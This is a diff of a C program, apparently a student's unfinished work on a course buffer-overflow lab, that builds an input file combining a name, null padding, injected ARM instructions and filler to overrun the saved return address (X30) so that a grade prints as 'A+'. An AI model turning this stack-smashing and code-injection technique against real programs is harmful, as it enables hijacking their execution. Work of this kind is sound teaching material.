@@ -23,18 +23,33 @@ int main(void)
    char* psName;
    FILE *psFile;
    psFile = fopen("dataAplus", "w");
-   psName = "Sean Wang";
+   psName = "Sean";
 
-   /* Writes the student's name to the dataA file */
+   /* Writes the student's name to the dataAplus file */
    for (i = 0; i<strlen(psName); i++){
        fprintf(psFile, "%c", psName[i]);
    }
-   /* Writes filler to the dataA file
+
+   /* Writes null character filler to the dataAplus file
    so instruction starts at multiple of 4 */
-   for (i = 0; i<3; i++){
+   for (i = 0; i<4; i++){
        fprintf(psFile, "%c", 0x00);
    }
+
    /* Writes the instruction mov w0, ‘A’ */
+   uiInstr = MiniAssembler_mov(0, 'A');
+   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+   /* Writes the instruction bl printf - incomplete*/
+   
+
+   /* Writes the instruction mov w0, '+' */ 
+   uiInstr = MiniAssembler_mov(0, '+');
+   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
+   /* Writes the instruction bl printf */
+
+   /* Writes the instruction mov w0, '\0' */ 
    uiInstr = MiniAssembler_mov(0, '\0');
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
  
@@ -52,9 +67,11 @@ int main(void)
    0x420070);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+   
+
    /* Writes enough null bytes to the dataB file
    to overrun until X30 */
-   for (i = 0; i<BUFSIZE-28; i++){
+   for (i = 0; i<BUFSIZE-44; i++){
        fprintf(psFile, "%c", 0x00);
    }
 
@@ -82,11 +99,10 @@ mov w0, 'A'
 bl putchar
 mov w0, '+'
 bl putchar
-mov w0, ''
-
-
-
-
-
-
+mov w0, '\0'
+adr x1, grade
+strb w0, [x1]
+b 0x40085c (call of printf)
+overrun until x30
+write address
 */
